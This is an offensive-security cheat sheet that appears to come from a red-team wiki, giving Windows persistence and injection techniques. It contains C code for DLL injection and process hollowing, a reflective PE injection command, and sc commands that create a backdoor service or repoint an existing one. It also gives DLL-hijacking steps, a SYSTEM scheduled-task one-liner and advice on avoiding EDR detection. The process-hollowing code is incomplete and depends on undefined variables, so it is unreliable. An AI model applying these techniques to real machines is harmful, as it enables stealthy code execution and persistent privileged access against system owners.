# DLL Injection & Malicious Services

!!! warning "Watch out"
    Malicious services and DLL injection are heavily signatured by modern EDR. In real engagements, prefer LOLBin-based persistence (scheduled tasks, registry run keys, COM hijacking) over dropping new binaries.

---

## Classic DLL Injection

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if (!hProcess) {
        printf("Failed to open process\n");
        return 1;
    }

    void* pDllPath = VirtualAllocEx(hProcess, NULL, strlen(argv[2]) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pDllPath, argv[2], strlen(argv[2]) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL);
    if (!hThread) {
        printf("Failed to create remote thread\n");
        return 1;
    }

    CloseHandle(hProcess);
    CloseHandle(hThread);
    return 0;
}
```

---

## Reflective DLL Injection

Loads a DLL directly into memory without writing to disk:

```powershell
Invoke-ReflectivePEInjection -PEPath C:\payload.dll -ProcessID 1234
```

---

## Process Hollowing

```c
#include <windows.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    void* pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pRemoteMemory, payload, payloadSize, NULL);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```

---

## Malicious Services

### Create a Backdoor Service

```powershell
sc create BackdoorService binPath= "C:\Windows\System32\cmd.exe /c C:\payload.exe" start= auto
sc start BackdoorService
```

### Modify an Existing Service

```powershell
sc config VulnerableService binPath= "C:\malicious.exe"
sc start VulnerableService
```

### DLL Hijacking via Service

1. Identify DLL loaded from unprotected path:

    ```powershell
    listdlls -accepteula | findstr "C:\Program Files\VulnerableApp\"
    ```

2. Replace with malicious DLL:

    ```powershell
    move C:\backdoor.dll "C:\Program Files\VulnerableApp\legit.dll"
    ```

### Scheduled Task Service Execution

```powershell
schtasks /create /tn "WinPersistence" /tr "C:\malicious.exe" /sc onlogon /ru SYSTEM
```
